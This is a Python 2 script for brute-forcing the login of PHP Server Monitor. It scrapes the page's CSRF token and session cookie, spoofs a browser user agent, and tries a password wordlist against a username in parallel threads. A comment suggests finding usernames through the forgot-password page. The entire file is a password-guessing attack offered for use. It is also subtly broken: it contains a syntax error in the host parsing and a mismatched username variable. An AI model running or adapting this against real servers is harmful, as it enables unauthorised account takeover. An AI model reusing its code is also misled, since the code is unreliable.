import requests
import sys
from multiprocessing.dummy import Pool as ThreadPool
from datetime import datetime
# Bruteforce php servermonitor
# Username can be found by bruteforcing the forgot password page
if len(sys.argv) < 2:
    print "servermonitor-brute.py uri wordlist username"
    exit(0)
startTime = datetime.now()
pool = ThreadPool(8)
usern = sys.argv[3]
anything = sys.argv[2]
wordlist = open(anything, "r")
wordlist = wordlist.readlines()
uri = sys.argv[1]
thehost = uri.split("/").[2]
r = requests.get(uri)
reply = r.text
for line in reply.split("\n"):
    if "csrf" in line:
        csrf = line
        i = 0
        for v in csrf.split(" "):
            if i == 3:
                u = 0
                for value in v.split('"'):
                    if u == 1:
                        csrftoken = value
                    u = u + 1
            i = i + 1
head = r.headers
mycookie = head.get('Set-Cookie')

passw = "test"
payload = "csrf="+csrftoken+"&user_name="+usrn+"&user_password="+passw+"&action=login"
x = 0
for m in mycookie.split("="):
    if x == 1:
        phpses = m
        n = 0
        for p in phpses.split(";"):
            if n == 0:
                phpid = p
            n = n + 1
    x = x + 1

cookies = dict(PHPSESSID=phpid)
headers={'Host':thehost, 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type':'application/x-www-form-urlencoded','Referrer':uri,'Connection':'close'}

passwords = []
for password in wordlist:
    passw = password.strip("\r\n")
    passw = str(passw)
    passwords += passw.split()

def bruteforcer(passw):
    payload = "csrf="+csrftoken+"&user_name="+usrn+"&user_password="+passw+"&action=login"
    print "[+] Trying "+passw
    newr = requests.post(uri, data=payload, headers=headers, cookies=cookies)
    strikinggold = newr.text
    success = "unknown"
    for line in strikinggold.split("\n"):
        if "The information is incorrec" in line:
            print "[-] Failed"
            success = "failures"
    if success == "failures":
        nothing = "nothing"
    else:
        print "[+]CHECK PASSWD " +passw
        exit(0)

results = pool.map(bruteforcer, passwords)
pool.close()
pool.join()
print datetime.now() - startTime
